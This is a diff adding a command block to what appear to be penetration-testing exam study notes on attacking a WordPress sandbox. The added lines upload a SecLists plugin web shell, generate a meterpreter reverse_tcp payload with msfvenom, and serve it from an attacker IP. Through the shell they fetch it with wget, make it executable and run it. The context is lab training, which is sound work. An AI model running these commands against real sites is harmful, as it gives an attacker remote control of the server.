@@ -214,7 +214,18 @@ For the exam Ssqlmap is not permitted. For training they recommend using it with
  
 `wpscan --url sandbox.local --enumerate ap,at,cb,dbe`
 
+ ```bash
+ cd /usr/share/seclists/Web-Shells/WordPress
+sudo zip plugin-shell.zip plugin-shell.php
+sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.140 LPORT=443 -f elf > shell.elf
+sudo python3 -m http.server 80
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.140/shell.elf
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
+# Start handler
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
 
+```
+ 
 
 
 
